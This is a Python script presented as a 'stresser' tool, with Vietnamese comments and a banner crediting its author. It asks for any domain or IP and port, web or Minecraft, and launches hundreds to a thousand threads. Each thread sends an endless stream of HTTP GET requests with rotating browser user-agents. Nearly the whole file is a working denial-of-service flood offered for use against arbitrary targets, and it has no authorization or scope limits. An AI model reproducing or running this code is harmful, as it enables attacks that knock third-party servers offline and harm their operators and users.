# ==========================================
# TOOL: NM-INTERNAL-STRESSER v1.1 (PRO)
# AUTHOR: NHAT MINH (The Creator)
# FEATURES: Auto-Domain, Multi-Color, Stealth
# ==========================================

import socket
import threading
import os
import random
import time
import sys

# Mã màu cho CMD thêm ngầu
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{BLUE}")
    print("    ###########################################")
    print("    #       NM-INTERNAL-STRESSER V1.1         #")
    print(f"    #      --- Created by {YELLOW}NHAT MINH{BLUE} ---       #")
    print("    ###########################################")
    print(f"    #  {GREEN}Trạng thái: Đang hoạt động (Chính chủ){BLUE}  #")
    print("    ###########################################" + RESET)

def stress_test(target_ip, target_port):
    # Tạo gói tin giả lập trình duyệt
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Safari/604.1"
    ]
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            
            # Gửi payload HTTP
            header = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n"
            s.send(header.encode())
            
            print(f"{GREEN}[Nhat Minh System] -> Gói tin đã đẩy tới {target_ip} thành công!{RESET}")
            s.close()
        except:
            print(f"{RED}[Nhat Minh System] -> Server đang nghẽn hoặc từ chối kết nối...{RESET}")
            time.sleep(0.1)

def main():
    banner()
    target = input(f"{YELLOW} -> Nhập Domain hoặc IP (Ví dụ: google.com): {RESET}")
    
    try:
        print(f"{BLUE}[*] Nhat Minh System đang phân giải tên miền...{RESET}")
        target_ip = socket.gethostbyname(target)
        print(f"{GREEN}[*] OK! Địa chỉ mục tiêu: {target_ip}{RESET}")
    except:
        print(f"{RED}[!] Lỗi: Tên miền không tồn tại!{RESET}")
        return

    port = int(input(f"{YELLOW} -> Nhập Port (Web: 80, MC: 25565): {RESET}"))
    threads = int(input(f"{YELLOW} -> Số luồng (Khuyên dùng 500-1000): {RESET}"))

    print(f"\n{BLUE}[*] Nhat Minh đang khởi động cuộc kiểm thử...{RESET}")
    time.sleep(1)

    for i in range(threads):
        t = threading.Thread(target=stress_test, args=(target_ip, port))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Đã dừng bởi Nhat Minh. Tạm biệt!{RESET}")

if __name__ == "__main__":
    main()